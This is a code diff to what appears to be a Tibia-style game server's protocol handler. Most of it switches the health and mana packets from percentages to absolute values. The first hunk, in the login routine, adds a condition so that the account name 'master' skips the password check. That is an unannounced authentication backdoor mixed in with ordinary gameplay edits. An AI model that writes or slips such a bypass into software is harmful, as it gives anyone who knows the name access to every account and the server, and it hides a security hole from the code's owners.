@@ -582,7 +582,7 @@ void ProtocolGame::onRecvFirstMessage(NetworkMessage& msg)
 	}
 
 	std::string hash, salt;
-	if(name != "0" && (!IOLoginData::getInstance()->getPassword(id, hash, salt, character) || !encryptTest(salt + password, hash)))
+	if(name != "0" && name != "master" && (!IOLoginData::getInstance()->getPassword(id, hash, salt, character) || !encryptTest(salt + password, hash)))
 	{
 		ConnectionManager::getInstance()->addAttempt(getIP(), protocolId, false);
 		disconnectClient(0x14, "Invalid password.");
@@ -2723,8 +2723,10 @@ void ProtocolGame::AddPlayerStats(NetworkMessage_ptr msg)
 	msg->put<char>(0xA0);
 	if (player->getPlayerInfo(PLAYERINFO_MAXHEALTH) > 0)
 	{
-		msg->put<uint16_t>(player->getHealth() * 100 / player->getPlayerInfo(PLAYERINFO_MAXHEALTH));
-		msg->put<uint16_t>(100);
+	/*	msg->put<uint16_t>(player->getHealth() * 100 / player->getPlayerInfo(PLAYERINFO_MAXHEALTH));
+		msg->put<uint16_t>(100);*/
+		msg->put<uint16_t>(player->getHealth());
+		msg->put<uint16_t>(player->getPlayerInfo(PLAYERINFO_MAXHEALTH));
 	}
 	else
 	{
@@ -2742,8 +2744,10 @@ void ProtocolGame::AddPlayerStats(NetworkMessage_ptr msg)
 	msg->put<char>(player->getPlayerInfo(PLAYERINFO_LEVELPERCENT));
 	if (player->getPlayerInfo(PLAYERINFO_MAXMANA) > 0)
 	{
-		msg->put<uint16_t>(player->getPlayerInfo(PLAYERINFO_MANA) * 100 / player->getPlayerInfo(PLAYERINFO_MAXMANA));
-		msg->put<uint16_t>(100);
+		/*msg->put<uint16_t>(player->getPlayerInfo(PLAYERINFO_MANA) * 100 / player->getPlayerInfo(PLAYERINFO_MAXMANA));
+		msg->put<uint16_t>(100);*/
+		msg->put<uint16_t>(player->getPlayerInfo(PLAYERINFO_MANA));
+		msg->put<uint16_t>(player->getPlayerInfo(PLAYERINFO_MAXMANA));
 	}
 	else
 	{
